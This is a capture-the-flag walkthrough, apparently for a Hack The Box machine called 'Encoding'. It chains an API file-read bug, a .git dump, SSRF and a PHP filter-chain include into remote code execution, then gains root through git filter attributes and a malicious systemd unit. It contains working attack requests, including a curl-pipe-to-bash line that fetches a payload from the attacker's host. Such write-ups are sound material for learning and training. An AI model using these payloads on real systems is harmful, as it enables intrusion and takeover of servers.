---
description: Actually harder than expected
---

# Encoding

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.143.79                               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 08:33 EST
Warning: 10.129.143.79 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.143.79
Host is up (0.16s latency).
Not shown: 64958 closed tcp ports (conn-refused), 575 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### HaxTables - Port 80

Here's the web page:

<figure><img src="../../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

There's some API documentations available for us to read.

<figure><img src="../../../.gitbook/assets/image (3789).png" alt=""><figcaption></figcaption></figure>

Interesting, and there's definitely some exploit available with this. However, just to be sure, I did a `gobuster` scan of the website with the php extension. Didn't manage to find much on the main website, but on the API domain I found something interesting.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -u http://api.haxtables.htb -t 100 -x php
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api.haxtables.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/30 08:43:21 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/v2                   (Status: 301) [Size: 319] [--> http://api.haxtables.htb/v2/]
/v1                   (Status: 301) [Size: 319] [--> http://api.haxtables.htb/v1/]
/utils.php            (Status: 200) [Size: 0]
/v3                   (Status: 301) [Size: 319] [--> http://api.haxtables.htb/v3/]
```

There was a `utils.php` file, which could be something. Also there were lots of different versions for stuff. Interesting.

On the main page, there were the type of conversions available, which were **string, integer and images**. The image one was the most suspicious.

<figure><img src="../../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

This was the only page that didn't have any API endpoint to use. When checking out `/v2` and `/v1`, it just tells me the page is under construction due to security issues.&#x20;

I decided to enumerate for subhosts with `wfuzz` because I had to find something to do with images for this machine. I managed to find another subdomain at `image.haxtables.htb`.

<figure><img src="../../../.gitbook/assets/image (2468).png" alt=""><figcaption></figcaption></figure>

This was the only request that led to a 403, which means it exists on the machine. I proceeded to attempt to scan for files on that domain using `feroxbuster`. Nothing found though.

### API LFI

When looking at the API a bit more, I found that it allows for LFI through their file\_url parameter:

```python
import requests

json_data = {
'action': 'str2hex',
'file_url' : 'file:///etc/passwd'
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)
```

This would output the content of whatever file I wanted. This works on the `/etc/passwd` file.

```
$ python3 lfi.py
{"data":"726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3130353a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a706f6c6c696e6174653a783a3130353a313a3a2f7661722f63616368652f706f6c6c696e6174653a2f62696e2f66616c73650a737368643a783a3130363a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a7379736c6f673a783a3130373a3131333a3a2f686f6d652f7379736c6f673a2f7573722f7362696e2f6e6f6c6f67696e0a75756964643a783a3130383a3131343a3a2f72756e2f75756964643a2f7573722f7362696e2f6e6f6c6f67696e0a74637064756d703a783a3130393a3131353a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a7473733a783a3131303a3131363a54504d20736f66747761726520737461636b2c2c2c3a2f7661722f6c69622f74706d3a2f62696e2f66616c73650a6c616e6473636170653a783a3131313a3131373a3a2f7661722f6c69622f6c616e6473636170653a2f7573722f7362696e2f6e6f6c6f67696e0a7573626d75783a783a3131323a34363a7573626d7578206461656d6f6e2c2c2c3a2f7661722f6c69622f7573626d75783a2f7573722f7362696e2f6e6f6c6f67696e0a7376633a783a313030303a313030303a7376633a2f686f6d652f7376633a2f62696e2f626173680a6c78643a783a3939393a3130303a3a2f7661722f736e61702f6c78642f636f6d6d6f6e2f6c78643a2f62696e2f66616c73650a66777570642d726566726573683a783a3131333a3132303a66777570642d7265667265736820757365722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a"}
```

Interesting. So, I started to look around for files that I could use and `gobusted` the website a bit more to find more stuff. I found a `handler.php` file on the main page.

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -u http://haxtables.htb -t 100 -k -x php 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://haxtables.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/30 09:13:20 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 1999]
/assets               (Status: 301) [Size: 315] [--> http://haxtables.htb/assets/]
/includes             (Status: 301) [Size: 317] [--> http://haxtables.htb/includes/]
/handler.php          (Status: 200) [Size: 38]
```

I used the LFI to read this thing. Here's the code:

```php
<?php
include_once '../api/utils.php';

if (isset($_FILES['data_file'])) {
    $is_file = true;
    $action = $_POST['action'];
    $uri_path = $_POST['uri_path'];
    $data = $_FILES['data_file']['tmp_name'];

} else {
    $is_file = false;
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];
    $data = $jsondata['data'];
    $uri_path = $jsondata['uri_path'];

    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);
        // echo jsonify(['message' => file_get_contents('php://input')]);
    }
}
$response = make_api_call($action, $data, $uri_path, $is_file);
echo $response;
?>
```

This file was taking JSON input from the user and doing...something. The most notable thing was the usage of `php://input`, where it is possible to inject code into this via a POST parameter.&#x20;

We can read the `/var/www/api/utils.php` file to get a clearer picture of what's going on.

```php
function get_url_content($url){
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
	jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;
}

function make_api_call($action, $data, $uri_path, $is_file = false){
    if ($is_file) {
        $post = [
            'data' => file_get_contents($data),
            'action' => $action,
            'uri_path' => $uri_path
        ];
    } else {
        $post = [
            'data' => $data,
            'action' => $action,
            'uri_path' => $uri_path
        ];
    }
```

This functio was taking the JSON data and checking for SSRF (poorly). It only checks for 127.0.0.1 and not hte actual domain name. This is definitely vulnerable, but I could not make this work.&#x20;

### Getting Stuck - Finding .git

I was stuck here for a while, as I was unable to enumerate any subdomain without getting rejected and I didn't know what other files existed on the server. I began testing random directories using the LFI I had found and just tried `/.git/HEAD` to see if it existed, and it did!

<figure><img src="../../../.gitbook/assets/image (2677).png" alt=""><figcaption></figcaption></figure>

So, now I know that there was a Git repository on this website, but the question was how to get it out. We could use `gitdumper.py`, but it would have to get the files out rather uniquely through the LFI and decode it from hex. Using this one-liner in bash, we could do just that:

```bash
curl -X POST -d '{"action": "str2hex","file_url" : "file:///var/www/image/.git/HEAD"}' http://api.haxtables.htb/v3/tools/string/index.php | cut -d ":" -f 2 | cut -d "\"" -f 2 | xxd -p -r
```

Then, within `gitdumper.sh`, we just need to replace the `curl` command with this:

```bash
curl -X POST -H 'Content-Type: application/json' -d "{\"action\": \"str2hex\",\"file_url\" : \"file:///var/www/image/.git/$objname\"}" http://api.haxtables.htb/v3/tools/string/index.php | cut -d ":" -f 2 | cut -d "\"" -f 2 | xxd -p -r > "$target"
```

Then we can simply run it and download all the files present on it. Now we can do some Git reviewing

### Git Reviewing --> RCE

From the `git log` command, we can find this output:

```
diff --git a/actions/action_handler.php b/actions/action_handler.php
new file mode 100644
index 0000000..2d600ee
--- /dev/null
+++ b/actions/action_handler.php
@@ -0,0 +1,13 @@
+<?php^M
+^M
+include_once 'utils.php';^M
+^M
+if (isset($_GET['page'])) {^M
+    $page = $_GET['page'];^M
+    include($page);^M
+^M
+} else {^M
+    echo jsonify(['message' => 'No page specified!']);^M
+}^M
+^M
+?>
```

So this file uses the `include()` function, which is vulnerable to the php filter chain attack.

{% embed url="https://github.com/synacktiv/php_filter_chain_generator" %}

Now, I just need a way to pass this parameter into the page via SSRF (on `handler.php`).  From the `api/utils.php` code, we can see that our `uri_path` parameter is passed here:

```php
$url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
```

We can truncate this using the @ symbol. The @ symbol would make the website think that the first part of the URL are credentials, and since the website does not require credentials, it would ignore it completely.

<figure><img src="../../../.gitbook/assets/image (2736).png" alt=""><figcaption></figcaption></figure>

Then we can use this to generate a shorthand line cf code to test our RCE ability. Shorthand PHP is used because the command for our shell is really long, so we need to make it as short as possible or the server might not process it due to size.

<figure><img src="../../../.gitbook/assets/image (1996).png" alt=""><figcaption></figcaption></figure>

Afterwards, we just send this POST request and our RCE works!

```http
POST /handler.php HTTP/1.1
Host: haxtables.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 6715

{"action":"",
"data":"",
"uri_path":"test@image.haxtables.htb/actions/action_handler.php?page=[OUTPUT]
```

<figure><img src="../../../.gitbook/assets/image (2581).png" alt=""><figcaption></figcaption></figure>

Now, we can use `curl` to get the machine to download and execute a bash script. I created a script named `g` with the `nc mkfifo` shell. Then, I used this line of code:

```php
<?= `curl http://10.10.14.53/g|bash`;?>'
```

Afterwards, I sent the exploit and got a shell.

<figure><img src="../../../.gitbook/assets/image (2812).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Git Privileges

Checking `sudo -l`, I saw that I had some permissions as the `svc` user.

```
www-data@encoding:~/image$ sudo -l
sudo -l
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
```

Here is what the script is doing:

```bash
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
```

In my testing, it seems I am able to write to this `.git` repository within the machine as `www-data`. In this case, there are no vulnerable commands being used at all, so the vulnerability lies in the attributes and configurations of `git`.

Here's a good read as to how `git` attributes can exploited:

{% embed url="https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes" %}

In particular, we can use `git config filter.indent.clean` to execute **whatever we want**. Then, it would execute at every single `git commit`. So I wrote a quick reverse shell at `/tmp/shell.sh`. Afterwards, I executed these few commands to set up the malicious attribute in `/var/www/image`.

```bash
git init
echo '*.php filter=indent' > .git/info/attributes
git config filter.indent.clean /tmp/lol
sudo -u svc /var/www/image/scripts/git-commit.sh
```

<figure><img src="../../../.gitbook/assets/image (1800).png" alt=""><figcaption></figcaption></figure>

The creator left a private SSH key in the directory for this new user, which was really useful.

### Systemctl Restart

This user had rather unique system privileges:

```
svc@encoding:~$ sudo -l
Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *
```

This exploit required us to write a `.conf` file within the `/etc/systemd` file with malicious commands, then restart the service to escalate our privileges.

{% embed url="https://gtfobins.github.io/gtfobins/systemctl/" %}

Conveniently, there was a writeable file in that directory.

```
svc@encoding:/etc/systemd$ ls -la
total 56
drwxr-xr-x    5 root root 4096 Jan 30 15:39 .
drwxr-xr-x  107 root root 4096 Jan 23 18:30 ..
-rw-r--r--    1 root root 1282 Apr  7  2022 journald.conf
-rw-r--r--    1 root root 1374 Apr  7  2022 logind.conf
drwxr-xr-x    2 root root 4096 Apr  7  2022 network
-rw-r--r--    1 root root  846 Mar 11  2022 networkd.conf
-rw-r--r--    1 root root  670 Mar 11  2022 pstore.conf
-rw-r--r--    1 root root 1406 Apr  7  2022 resolved.conf
-rw-r--r--    1 root root  931 Mar 11  2022 sleep.conf
drwxrwxr-x+  22 root root 4096 Jan 30 15:39 system
```

Following GTFOBins, we can create a small conf file for PE.

{% code title="gg.service" %}
```
[Service]
Type=oneshot
ExecStart=chmod +s /bin/bash
[Install]
WantedBy=multi-user.target

afterwards run sudo systemctl restart gg
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1414).png" alt=""><figcaption></figcaption></figure>

Rooted!
